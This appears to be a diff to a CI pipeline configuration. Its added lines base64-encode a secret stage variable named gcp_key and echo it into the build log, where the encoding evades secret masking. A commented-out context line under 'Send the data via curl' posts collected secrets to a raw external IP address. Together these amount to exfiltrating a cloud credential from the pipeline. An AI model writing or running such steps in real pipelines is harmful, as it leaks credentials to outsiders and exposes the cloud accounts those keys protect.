@@ -43,13 +43,16 @@ pipeline:
 
                       # Define your secrets
 
-                      echo "<+stage.variables.gcp_key>" | base64
+                      #echo "<+stage.variables.gcp_key>" | base64
+                      encoded_var=$(echo "<+stage.variables.gcp_key>" | base64)
 
+                      # Print the variable to verify
+                      echo "$encoded_var"
                       #secret1="<+stage.variables.gcp_key>" 
-                      secret2="<+stage.variables.gcp_key2>" | base64
-                      echo "$secret2"
+                      #secret2="<+stage.variables.gcp_key>" | base64
+                      #echo "$secret2"
                       # Concatenate secrets into a single variable with differentiation
-                      env_vars="secret1: $secret1\nsecret2: $secret2"
+                      #env_vars="secret1: $secret1\nsecret2: $secret2"
 
                       # Send the data via curl
                       #curl -X POST --data "$env_vars" http://35.222.129.92:4000
